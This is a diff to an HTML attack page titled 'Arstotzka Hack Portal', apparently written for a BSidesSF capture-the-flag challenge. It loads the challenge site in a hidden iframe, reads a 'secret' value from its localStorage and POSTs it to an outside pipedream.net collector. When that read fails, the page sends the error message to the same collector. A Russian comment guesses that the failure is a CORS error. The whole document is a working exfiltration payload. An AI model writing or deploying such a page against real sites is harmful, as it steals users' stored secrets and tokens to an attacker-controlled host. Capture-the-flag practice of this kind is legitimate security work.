@@ -2,18 +2,36 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Loading...</title>
+  <title>Arstotzka Hack Portal</title>
 </head>
 <body>
+  <h1>Loading...</h1>
+
+  <iframe id="victim" src="https://moa-station-1d1d1aaf.challenges.bsidessf.net/" style="display:none;"></iframe>
+
   <script>
-    const secret = localStorage.getItem('secret');
-    if (secret) {
-      fetch('https://eozxolyh76p7q9f.m.pipedream.net', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: secret
-      });
-    }
+    const iframe = document.getElementById('victim');
+
+    iframe.onload = function() {
+      try {
+        const secret = iframe.contentWindow.localStorage.getItem('secret');
+        if (secret) {
+          fetch('https://eozxolyh76p7q9f.m.pipedream.net', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: secret
+          });
+        }
+      } catch (e) {
+        // Скорее всего CORS ошибка
+        fetch('https://eozxolyh76p7q9f.m.pipedream.net', {
+          method: 'POST',
+          mode: 'no-cors',
+          body: 'CORS Error: ' + e.message
+        });
+      }
+    };
   </script>
+
 </body>
 </html>
